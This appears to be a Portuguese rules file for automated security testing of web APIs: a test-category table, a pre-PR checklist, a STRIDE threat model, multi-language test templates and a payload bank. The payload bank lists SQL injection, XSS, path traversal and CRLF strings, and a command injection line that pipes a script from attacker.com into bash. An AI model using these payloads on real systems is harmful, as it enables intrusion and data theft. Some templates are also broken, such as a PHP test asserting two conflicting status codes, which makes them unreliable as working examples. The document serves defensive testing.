---
inclusion: auto
---

# Validation — Testes, Checklist e Threat Modeling

> Testes de segurança são gerados automaticamente junto com o código. Checklist aplicado antes de todo PR.

---

## Testes de Segurança — Geração Automática

Todo código que recebe input externo DEVE ter testes de segurança gerados como parte obrigatória.

### Categorias de Teste Obrigatórias

| # | Categoria | Validação |
|---|---|---|
| 1 | Autenticação (401) | Sem token, token expirado/inválido/malformado, algorithm none |
| 2 | Autorização (403) | Sem role, IDOR, escalação, outro tenant, manipulação userId |
| 3 | Validação Input (400) | Campo ausente, excede limite, formato inválido, tipo errado, body vazio |
| 4 | SQL Injection | OR 1=1, DROP TABLE, UNION SELECT — tabela intacta |
| 5 | XSS | script/img/onerror payloads — escapados na resposta |
| 6 | Command Injection | ; ls, pipe cat, $(whoami) — não executar |
| 7 | Path Traversal | ../../../etc/passwd, URL encoded — bloquear (400/403) |
| 8 | CRLF Injection | %0d%0a header injection — não injetar |
| 9 | Rate Limiting (429) | 100+ req/min, 5+ login falhados — 429 |
| 10 | Dados Sensíveis | passwordHash, stack trace, CPF sem máscara — NUNCA na resposta |
| 11 | CORS | Origin não autorizada, null, wildcard com credentials — rejeitar |
| 12 | Timeout/DoS | Body 100MB (413), JSON aninhado, query sem paginação, ReDoS |
| 13 | Upload | Arquivo maior que 10MB, extensão proibida, MIME mismatch |
| 14 | Sessão/Cookies | Sem Secure/HttpOnly/SameSite, não invalidada no logout |
| 15 | Headers Segurança | X-Content-Type-Options, X-Frame-Options, HSTS, CSP presentes |
| 16 | CSRF | POST/PUT/DELETE sem token CSRF (se usa cookies) — 403 |
| 17 | Mass Assignment | Campo role/isAdmin/balance no body — ignorado |
| 18 | Business Logic | Quantidade negativa, preço zero, desconto acima de 100%, duplicação |
| 19 | Desserialização | proto pollution, XXE com DTD, YAML com execução — rejeitar |
| 20 | Criptografia | JWT algorithm none, sem validar issuer/audience/exp |

### Nomenclatura Padrão
- should_return_401_when_no_auth_token_provided
- should_return_403_when_user_accesses_other_users_resource
- should_return_400_when_name_exceeds_100_characters
- should_not_execute_sql_when_input_contains_injection
- should_not_reflect_xss_payload_in_response
- should_return_429_when_rate_limit_exceeded

### Cobertura Mínima por Componente

| Componente | Testes Obrigatórios |
|---|---|
| Controller | Auth(401), Authz(403), Validation(400), RateLimit(429), CORS, Headers, CSRF |
| Service | Business logic, ownership, idempotência, race conditions |
| Repository | SQL parametrizado, paginação |
| DTO | Validação, limites, mass assignment |
| Upload | Tipo, tamanho, nome, conteúdo |
| Integração | Timeout, circuit breaker, validação resposta |
| Auth | JWT, session, cookies |

---

## Checklist de Segurança Pré-PR

Verificar automaticamente antes de qualquer commit ou pull request:

### Autenticação e Autorização
- [ ] Todo endpoint tem autenticação
- [ ] Todo endpoint verifica autorização (role ou ownership)
- [ ] Operações sensíveis exigem re-autenticação

### Input e Validação
- [ ] TODO input tem limite de caracteres
- [ ] TODO input passa por sanitização
- [ ] Validação de tipo, formato e range

### Dados e Privacidade
- [ ] Nenhum PII em logs
- [ ] Dados sensíveis mascarados em respostas
- [ ] Classificação da informação respeitada

### Credenciais e Segredos
- [ ] Nenhuma credencial hardcoded
- [ ] Segredos via vault/env em runtime
- [ ] Nenhum segredo em logs ou erros

### Injeção e XSS
- [ ] Nenhuma concatenação em SQL
- [ ] Nenhum eval/exec com dados externos
- [ ] Output encoding em saídas HTML

### Dependências
- [ ] Nenhum CVE crítico conhecido
- [ ] Versões fixas (pinned)
- [ ] Nenhuma biblioteca proibida/EOL

### Infraestrutura
- [ ] TLS 1.2+ em todas as conexões
- [ ] Security groups restritivos
- [ ] Containers não-root

### Logging e Error Handling
- [ ] Logs de auth (sucesso e falha)
- [ ] Correlation ID nas requisições
- [ ] Nenhum stack trace ao cliente
- [ ] Nenhuma info de tecnologia em headers

---

## Threat Modeling (STRIDE)

Gerar threat model automaticamente ao criar features significativas (auth, dados pessoais, integração externa, upload, pagamento, admin, API pública).

| Ameaça | Pergunta | Mitigação Padrão |
|---|---|---|
| Spoofing | Alguém pode se passar por outro? | JWT + MFA + rate limiting |
| Tampering | Dados podem ser alterados? | Validação + HMAC + transações |
| Repudiation | Ações podem ser negadas? | Logs + CorrelationID + auditoria |
| Info Disclosure | Dados podem vazar? | Criptografia + mascaramento + DTOs |
| DoS | Serviço pode ser derrubado? | Rate limit + timeout + circuit breaker |
| Elevation | Acesso indevido possível? | RBAC + ownership + menor privilégio |

Ao detectar feature complexa (auth, crypto, upload, pagamento):
- Sugerir revisão por Security Champion
- Indicar que threat model deve ser revisado por AppSec

---

## Métricas de Compliance

### Por PR
- Testes de segurança presentes e passando
- Nenhuma violação crítica detectada
- Checklist completo

### Por Sprint
- Percentual de PRs com testes de segurança
- Tempo médio de correção de vulnerabilidades
- Número de violações bloqueadas pelos hooks


---

## Templates de Testes de Segurança

> Exemplos prontos de testes para cada categoria principal. Copie e adapte ao seu projeto.

### Teste de 401 — Sem Token

**TypeScript (Vitest)**
```typescript
import { describe, it, expect } from 'vitest';
import request from 'supertest';
import { app } from '../src/app';

describe('Authentication - 401 Unauthorized', () => {
  it('should_return_401_when_no_auth_token_provided', async () => {
    const response = await request(app)
      .get('/api/v1/users/me')
      .set('Accept', 'application/json');

    expect(response.status).toBe(401);
    expect(response.body).not.toHaveProperty('stack');
    expect(response.body.message).toBe('Authentication required');
  });

  it('should_return_401_when_token_is_expired', async () => {
    const expiredToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNjAwMDAwMDAwfQ.invalid';
    const response = await request(app)
      .get('/api/v1/users/me')
      .set('Authorization', `Bearer ${expiredToken}`);

    expect(response.status).toBe(401);
  });
});
```

**Java (JUnit + Spring Boot)**
```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class AuthenticationTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @Test
    void should_return_401_when_no_auth_token_provided() {
        ResponseEntity<String> response = restTemplate
            .getForEntity("/api/v1/users/me", String.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);
        assertThat(response.getBody()).doesNotContain("stackTrace");
    }

    @Test
    void should_return_401_when_token_is_malformed() {
        HttpHeaders headers = new HttpHeaders();
        headers.set("Authorization", "Bearer invalid.token.here");

        ResponseEntity<String> response = restTemplate.exchange(
            "/api/v1/users/me", HttpMethod.GET,
            new HttpEntity<>(headers), String.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);
    }
}
```

---

### Teste de 403 — Token de Outro Usuário (IDOR/BOLA)

**TypeScript (Vitest)**
```typescript
describe('Authorization - 403 Forbidden (IDOR)', () => {
  it('should_return_403_when_user_accesses_other_users_resource', async () => {
    const userAToken = await getTokenForUser('user-a-id');

    const response = await request(app)
      .get('/api/v1/users/user-b-id/orders')
      .set('Authorization', `Bearer ${userAToken}`);

    expect(response.status).toBe(403);
    expect(response.body.message).toBe('Access denied');
    expect(response.body).not.toHaveProperty('data');
  });

  it('should_return_403_when_regular_user_accesses_admin_endpoint', async () => {
    const regularToken = await getTokenForUser('regular-user-id');

    const response = await request(app)
      .get('/api/v1/admin/users')
      .set('Authorization', `Bearer ${regularToken}`);

    expect(response.status).toBe(403);
  });
});
```

**Java (JUnit + Spring Boot)**
```java
@Test
@WithMockUser(username = "user-a", roles = {"USER"})
void should_return_403_when_user_accesses_other_users_resource() throws Exception {
    mockMvc.perform(get("/api/v1/users/user-b-id/orders")
            .contentType(MediaType.APPLICATION_JSON))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.data").doesNotExist());
}

@Test
@WithMockUser(username = "regular-user", roles = {"USER"})
void should_return_403_when_regular_user_accesses_admin_endpoint() throws Exception {
    mockMvc.perform(get("/api/v1/admin/users"))
        .andExpect(status().isForbidden());
}
```

---

### Teste de SQL Injection — Payload Malicioso

**TypeScript (Vitest)**
```typescript
describe('SQL Injection Prevention', () => {
  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT password FROM users --",
    "1; DELETE FROM orders WHERE 1=1",
    "admin'--"
  ];

  it.each(sqlPayloads)(
    'should_not_execute_sql_when_input_contains: %s',
    async (payload) => {
      const response = await request(app)
        .get(`/api/v1/users/search`)
        .query({ name: payload })
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.status).toBeOneOf([400, 200]);
      // Verificar que dados não foram alterados
      const usersCount = await db.query('SELECT COUNT(*) FROM users');
      expect(usersCount).toBe(originalCount);
    }
  );
});
```

**Java (JUnit + Spring Boot)**
```java
@ParameterizedTest
@ValueSource(strings = {
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT password FROM users --",
    "1; DELETE FROM orders WHERE 1=1",
    "admin'--"
})
void should_not_execute_sql_when_input_contains_injection(String payload) throws Exception {
    long countBefore = userRepository.count();

    mockMvc.perform(get("/api/v1/users/search")
            .param("name", payload)
            .with(jwt()))
        .andExpect(status().isIn(200, 400));

    assertThat(userRepository.count()).isEqualTo(countBefore);
}
```

---

### Teste de XSS — Payload em Input

**TypeScript (Vitest)**
```typescript
describe('XSS Prevention', () => {
  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(document.cookie)>',
    "javascript:alert('xss')",
    '<iframe src="javascript:alert(1)">'
  ];

  it.each(xssPayloads)(
    'should_not_reflect_xss_payload_in_response: %s',
    async (payload) => {
      const response = await request(app)
        .post('/api/v1/comments')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ content: payload });

      const body = JSON.stringify(response.body);
      expect(body).not.toContain('<script>');
      expect(body).not.toContain('onerror=');
      expect(body).not.toContain('onload=');
      expect(body).not.toContain('javascript:');
    }
  );
});
```

**Java (JUnit + Spring Boot)**
```java
@ParameterizedTest
@ValueSource(strings = {
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg onload=alert(document.cookie)>",
    "javascript:alert('xss')",
    "<iframe src=\"javascript:alert(1)\">"
})
void should_not_reflect_xss_payload_in_response(String payload) throws Exception {
    String requestBody = String.format("{\"content\": \"%s\"}", 
        payload.replace("\"", "\\\""));

    MvcResult result = mockMvc.perform(post("/api/v1/comments")
            .contentType(MediaType.APPLICATION_JSON)
            .content(requestBody)
            .with(jwt()))
        .andReturn();

    String responseBody = result.getResponse().getContentAsString();
    assertThat(responseBody).doesNotContain("<script>");
    assertThat(responseBody).doesNotContain("onerror=");
    assertThat(responseBody).doesNotContain("onload=");
}
```

---

### Teste de Rate Limiting — Muitas Requests

**TypeScript (Vitest)**
```typescript
describe('Rate Limiting - 429 Too Many Requests', () => {
  it('should_return_429_when_rate_limit_exceeded', async () => {
    const requests = Array.from({ length: 110 }, () =>
      request(app)
        .get('/api/v1/products')
        .set('Authorization', `Bearer ${validToken}`)
    );

    const responses = await Promise.all(requests);
    const tooManyRequests = responses.filter(r => r.status === 429);

    expect(tooManyRequests.length).toBeGreaterThan(0);
    expect(tooManyRequests[0].headers['retry-after']).toBeDefined();
  });

  it('should_return_429_after_5_failed_login_attempts', async () => {
    for (let i = 0; i < 6; i++) {
      const response = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: 'user@test.com', password: 'wrong' });

      if (i >= 5) {
        expect(response.status).toBe(429);
      }
    }
  });
});
```

**Java (JUnit + Spring Boot)**
```java
@Test
void should_return_429_when_rate_limit_exceeded() throws Exception {
    int rateLimitHits = 0;

    for (int i = 0; i < 110; i++) {
        MvcResult result = mockMvc.perform(get("/api/v1/products")
                .with(jwt()))
            .andReturn();

        if (result.getResponse().getStatus() == 429) {
            rateLimitHits++;
        }
    }

    assertThat(rateLimitHits).isGreaterThan(0);
}

@Test
void should_return_429_after_5_failed_login_attempts() throws Exception {
    for (int i = 0; i < 6; i++) {
        ResultActions result = mockMvc.perform(post("/api/v1/auth/login")
            .contentType(MediaType.APPLICATION_JSON)
            .content("{\"email\":\"user@test.com\",\"password\":\"wrong\"}"));

        if (i >= 5) {
            result.andExpect(status().isTooManyRequests());
        }
    }
}
```

---

### Teste de Input Validation — Campo Acima do Limite

**TypeScript (Vitest)**
```typescript
describe('Input Validation - Field Limits', () => {
  it('should_return_400_when_name_exceeds_100_characters', async () => {
    const longName = 'A'.repeat(101);

    const response = await request(app)
      .post('/api/v1/users')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ name: longName, email: 'test@example.com' });

    expect(response.status).toBe(400);
    expect(response.body.errors).toBeDefined();
  });

  it('should_return_400_when_body_exceeds_max_size', async () => {
    const hugePayload = { data: 'X'.repeat(1_048_577) }; // > 1MB

    const response = await request(app)
      .post('/api/v1/upload/json')
      .set('Authorization', `Bearer ${validToken}`)
      .send(hugePayload);

    expect(response.status).toBeOneOf([400, 413]);
  });

  it('should_return_400_when_email_format_is_invalid', async () => {
    const response = await request(app)
      .post('/api/v1/users')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ name: 'Test', email: 'not-an-email' });

    expect(response.status).toBe(400);
  });
});
```

**Java (JUnit + Spring Boot)**
```java
@Test
void should_return_400_when_name_exceeds_100_characters() throws Exception {
    String longName = "A".repeat(101);
    String body = String.format("{\"name\":\"%s\",\"email\":\"test@example.com\"}", longName);

    mockMvc.perform(post("/api/v1/users")
            .contentType(MediaType.APPLICATION_JSON)
            .content(body)
            .with(jwt().authorities(new SimpleGrantedAuthority("ROLE_ADMIN"))))
        .andExpect(status().isBadRequest())
        .andExpect(jsonPath("$.errors").exists());
}

@Test
void should_return_400_when_email_format_is_invalid() throws Exception {
    mockMvc.perform(post("/api/v1/users")
            .contentType(MediaType.APPLICATION_JSON)
            .content("{\"name\":\"Test\",\"email\":\"not-an-email\"}")
            .with(jwt().authorities(new SimpleGrantedAuthority("ROLE_ADMIN"))))
        .andExpect(status().isBadRequest());
}
```

---

### Banco de Payloads para Testes

> Payloads organizados por categoria para uso em testes automatizados e manuais.

#### SQL Injection Payloads

```text
' OR '1'='1' --
' UNION SELECT username, password FROM users --
'; DROP TABLE users; --
1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
' OR 1=1; INSERT INTO admin_users(username,password) VALUES('hacker','pwd') --
```

#### XSS Payloads

```text
<script>alert('XSS')</script>
<img src=x onerror=alert(document.cookie)>
"><svg/onload=alert('XSS')>
javascript:alert('XSS')
<div onmouseover="alert('XSS')">hover me</div>
```

#### Command Injection Payloads

```text
; cat /etc/passwd
| whoami
$(curl http://attacker.com/shell.sh | bash)
```

#### Path Traversal Payloads

```text
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
```

#### CRLF Injection Payloads

```text
%0d%0aSet-Cookie:%20malicious=true
%0d%0aLocation:%20http://attacker.com
```

---

### Templates Adicionais por Linguagem

#### Python (pytest + httpx)

```python
import pytest
import httpx

BASE_URL = "http://localhost:8000/api/v1"

class TestAuthentication:
    def test_should_return_401_when_no_token(self):
        response = httpx.get(f"{BASE_URL}/users/me")
        assert response.status_code == 401
        assert "stack" not in response.text

    def test_should_return_401_when_token_expired(self):
        headers = {"Authorization": "Bearer expired.token.here"}
        response = httpx.get(f"{BASE_URL}/users/me", headers=headers)
        assert response.status_code == 401

class TestAuthorization:
    def test_should_return_403_when_accessing_other_users_resource(self, user_a_token):
        headers = {"Authorization": f"Bearer {user_a_token}"}
        response = httpx.get(f"{BASE_URL}/users/user-b-id/orders", headers=headers)
        assert response.status_code == 403

class TestSQLInjection:
    @pytest.mark.parametrize("payload", [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT password FROM users --",
    ])
    def test_should_not_execute_sql_injection(self, payload, auth_headers):
        response = httpx.get(f"{BASE_URL}/users/search", params={"name": payload}, headers=auth_headers)
        assert response.status_code in [200, 400]

class TestInputValidation:
    def test_should_return_400_when_name_exceeds_limit(self, admin_headers):
        response = httpx.post(f"{BASE_URL}/users", json={"name": "A" * 101, "email": "t@t.com"}, headers=admin_headers)
        assert response.status_code == 400
```

#### C# (xUnit + WebApplicationFactory)

```csharp
public class AuthenticationTests : IClassFixture<WebApplicationFactory<Program>>
{
    private readonly HttpClient _client;

    public AuthenticationTests(WebApplicationFactory<Program> factory)
    {
        _client = factory.CreateClient();
    }

    [Fact]
    public async Task Should_Return_401_When_No_Token()
    {
        var response = await _client.GetAsync("/api/v1/users/me");
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task Should_Return_403_When_Accessing_Other_Users_Resource()
    {
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", userAToken);
        var response = await _client.GetAsync("/api/v1/users/user-b-id/orders");
        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
    }

    [Theory]
    [InlineData("' OR '1'='1")]
    [InlineData("'; DROP TABLE users; --")]
    [InlineData("' UNION SELECT password FROM users --")]
    public async Task Should_Not_Execute_SQL_Injection(string payload)
    {
        var response = await _client.GetAsync($"/api/v1/users/search?name={Uri.EscapeDataString(payload)}");
        Assert.True(response.StatusCode == HttpStatusCode.OK || response.StatusCode == HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Should_Return_400_When_Name_Exceeds_100_Characters()
    {
        var body = new { name = new string('A', 101), email = "test@example.com" };
        var response = await _client.PostAsJsonAsync("/api/v1/users", body);
        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
    }
}
```

#### PHP (PHPUnit + Laravel)

```php
class AuthenticationTest extends TestCase
{
    public function test_should_return_401_when_no_token(): void
    {
        $response = $this->getJson('/api/v1/users/me');
        $response->assertStatus(401);
        $response->assertJsonMissing(['stack']);
    }

    public function test_should_return_403_when_accessing_other_users_resource(): void
    {
        $userA = User::factory()->create();
        $userB = User::factory()->create();

        $response = $this->actingAs($userA)->getJson("/api/v1/users/{$userB->id}/orders");
        $response->assertStatus(403);
    }

    /**
     * @dataProvider sqlInjectionPayloads
     */
    public function test_should_not_execute_sql_injection(string $payload): void
    {
        $user = User::factory()->create();
        $countBefore = User::count();

        $response = $this->actingAs($user)->getJson("/api/v1/users/search?name=" . urlencode($payload));
        $response->assertStatus(200)->assertStatus(400);

        $this->assertEquals($countBefore, User::count());
    }

    public static function sqlInjectionPayloads(): array
    {
        return [
            ["' OR '1'='1"],
            ["'; DROP TABLE users; --"],
            ["' UNION SELECT password FROM users --"],
        ];
    }

    public function test_should_return_400_when_name_exceeds_limit(): void
    {
        $admin = User::factory()->admin()->create();
        $response = $this->actingAs($admin)->postJson('/api/v1/users', [
            'name' => str_repeat('A', 101),
            'email' => 'test@example.com',
        ]);
        $response->assertStatus(400);
    }

    public function test_should_return_422_when_csrf_token_missing(): void
    {
        $response = $this->post('/admin/settings', ['key' => 'value']);
        $response->assertStatus(419); // Laravel CSRF
    }
}
```

#### Kotlin (JUnit 5 + Spring Boot)

```kotlin
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class SecurityTests @Autowired constructor(
    private val restTemplate: TestRestTemplate
) {
    @Test
    fun `should return 401 when no auth token provided`() {
        val response = restTemplate.getForEntity("/api/v1/users/me", String::class.java)
        assertThat(response.statusCode).isEqualTo(HttpStatus.UNAUTHORIZED)
    }

    @Test
    fun `should return 403 when user accesses other users resource`() {
        val headers = HttpHeaders().apply { setBearerAuth(userAToken) }
        val response = restTemplate.exchange(
            "/api/v1/users/user-b-id/orders", HttpMethod.GET,
            HttpEntity<Void>(headers), String::class.java
        )
        assertThat(response.statusCode).isEqualTo(HttpStatus.FORBIDDEN)
    }

    @ParameterizedTest
    @ValueSource(strings = ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT password FROM users --"])
    fun `should not execute sql injection`(payload: String) {
        val headers = HttpHeaders().apply { setBearerAuth(validToken) }
        val response = restTemplate.exchange(
            "/api/v1/users/search?name=${URLEncoder.encode(payload, "UTF-8")}",
            HttpMethod.GET, HttpEntity<Void>(headers), String::class.java
        )
        assertThat(response.statusCode).isIn(HttpStatus.OK, HttpStatus.BAD_REQUEST)
    }

    @Test
    fun `should return 400 when name exceeds 100 characters`() {
        val body = mapOf("name" to "A".repeat(101), "email" to "test@example.com")
        val headers = HttpHeaders().apply { setBearerAuth(adminToken); contentType = MediaType.APPLICATION_JSON }
        val response = restTemplate.exchange(
            "/api/v1/users", HttpMethod.POST,
            HttpEntity(body, headers), String::class.java
        )
        assertThat(response.statusCode).isEqualTo(HttpStatus.BAD_REQUEST)
    }
}
```
